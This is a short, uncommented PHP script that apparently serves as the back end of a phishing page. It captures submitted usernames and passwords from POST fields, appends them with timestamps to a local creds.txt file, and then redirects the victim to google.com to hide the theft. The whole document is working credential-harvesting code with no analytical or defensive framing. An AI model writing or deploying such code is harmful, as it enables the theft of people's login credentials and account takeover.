
<?php
$log = fopen("creds.txt", "a");
fwrite($log, "User: ".$_POST['user']." | Pass: ".$_POST['pass']." | Time: ".date("Y-m-d H:i:s")."\n");
fclose($log);
header('Location: https://www.google.com');
exit();
?>
